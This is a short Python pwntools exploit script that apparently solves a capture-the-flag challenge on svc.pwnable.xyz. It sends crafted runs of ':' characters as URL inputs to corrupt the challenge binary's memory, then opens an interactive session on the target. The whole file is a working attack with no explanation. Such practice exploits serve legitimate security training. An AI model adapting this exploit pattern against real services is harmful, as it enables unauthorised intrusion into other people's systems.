from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30021

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def create_url(r, url):    
    r.sendlineafter(b"> ", b"2")
    r.sendafter(b"insecure: ", b"http://")
    r.sendlineafter(b"url: ", str(len(url)).encode())

    r.send(url)
    
def main():
    r  = conn()
    
    create_url(r, b":" * 127)
    create_url(r, b":" * 127)
    create_url(r, b":" * 8)

    r.sendlineafter(b"> ", b"4")    
    r.interactive()

if __name__ == "__main__":
    main()
